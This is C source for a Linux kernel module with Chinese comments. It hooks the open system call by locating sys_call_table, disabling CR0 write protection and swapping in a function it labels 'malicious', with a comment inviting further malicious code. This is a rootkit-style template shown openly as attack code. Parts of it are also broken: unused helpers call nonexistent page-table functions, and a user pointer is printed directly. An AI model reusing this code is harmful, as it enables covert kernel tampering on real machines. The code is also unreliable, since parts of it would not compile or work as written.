#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Bard");
MODULE_DESCRIPTION("Hooks the open system call");

asmlinkage long (*original_open)(const char __user *filename, int flags, umode_t mode);  //定义指向系统调用的指针

//定义恶意函数
asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode) {
    printk(KERN_INFO "Hacked open called for file: %s\n", filename);
    //此部分可以添加额外恶意代码
    return original_open(filename, flags, mode);
}

//使页面可写
int make_rw(unsigned long address) {
    unsigned int level;
    pte_t *pte = ptep_modify_prot_start(NULL, current->mm->pgd, address, &level);
    if (!pte) {
        return -1;
    }
    pte_set_rw(pte);
    ptep_modify_prot_commit(NULL, current->mm->pgd, address, level, pte);
    return 0;
}

//再次将页面设置只读
int make_ro(unsigned long address) {
    unsigned int level;
    pte_t *pte = ptep_modify_prot_start(NULL, current->mm->pgd, address, &level);
    if (!pte) {
        return -1;
    }
    pte_set_ro(pte);
    ptep_modify_prot_commit(NULL, current->mm->pgd, address, level, pte);
    return 0;
}

//禁用页面可写保护
void disable_wp(void) {
    write_cr0(read_cr0() & (~0x10000));
}

//启用页面可写保护
void enable_wp(void) {
    write_cr0(read_cr0() | 0x10000);
}

//获取系统调用表地址的函数
unsigned long *get_syscall_table_address(void) {
    return (unsigned long*)kallsyms_lookup_name("sys_call_table");
}

static int __init syscall_hook_init(void) {
    unsigned long *syscall_table;
    syscall_table = get_syscall_table_address();
    if (!syscall_table) {
        printk(KERN_ERR "Failed to find syscall table address\n");
        return -1;
    }
    printk(KERN_INFO "Syscall table address: %p\n", syscall_table);

    //保存原始系统调用
    original_open = (void *)syscall_table[__NR_open];

    //禁用可写保护
    disable_wp();

    //Hook系统调用
    syscall_table[__NR_open] = (unsigned long)hacked_open;

    //重新启用可写保护
    enable_wp();

    printk(KERN_INFO "open syscall hooked\n");
    return 0;
}

static void __exit syscall_hook_exit(void) {
    unsigned long *syscall_table;
    syscall_table = get_syscall_table_address();
    if (!syscall_table) {
        printk(KERN_ERR "Failed to find syscall table address\n");
        return;
    }

    //禁用可写保护
    disable_wp();

    //恢复原来的系统调用
    syscall_table[__NR_open] = (unsigned long)original_open;

    //重新启用可写保护
    enable_wp();

    printk(KERN_INFO "open syscall unhooked\n");
}

module_init(syscall_hook_init);
module_exit(syscall_hook_exit);
